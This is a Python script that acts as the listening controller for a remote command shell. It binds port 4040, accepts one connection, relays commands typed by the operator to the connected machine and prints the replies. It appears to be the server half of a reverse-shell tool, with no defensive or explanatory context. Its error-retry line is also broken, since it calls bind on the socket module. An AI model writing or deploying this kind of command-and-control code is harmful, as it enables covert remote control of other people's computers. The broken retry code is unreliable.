import socket
import sys
def create_socket():
    try: 
        global ip
        global port
        global s
        ip = ''
        port = 4040
        s = socket.socket()
    except socket.error as msg:
        print(msg)


def create_bind():
    try:
        global ip
        global port
        global s
        s.bind((ip, port))
        s.listen(5)
    except socket.error as msg:
        print('retry..')
        socket.bind()


def accept_conn():
    conn, address = s.accept()
    print(f"connection success host {address[0]} port {address[1]}")
    send_command(conn)
    conn.close()

def send_command(conn):
    while True:
        cmd = input('')
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        elif len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end="")

def main():
    create_socket()
    create_bind()
    accept_conn()

main()